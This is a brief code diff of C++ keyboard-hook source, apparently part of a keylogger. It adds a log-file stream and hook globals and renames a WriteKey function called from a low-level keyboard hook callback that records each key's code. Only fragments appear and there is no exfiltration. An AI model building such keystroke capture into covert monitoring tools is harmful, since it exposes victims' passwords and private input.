@@ -1,5 +1,10 @@
 #include "KeyboardHook.h"
 
+std::ofstream logFile;
+
+HHOOK _hook;
+
+KBDLLHOOKSTRUCT kbdStruct;
 
 void SetHook(std::string file){
     
@@ -20,7 +25,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-            writeKey(kbdStruct.vkCode);
+            WriteKey(kbdStruct.vkCode);
 
         }
 
@@ -29,7 +34,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-void writeKey(int key) {
+void WriteKey(int key) {
 
 	switch (key) {
 	case 160:
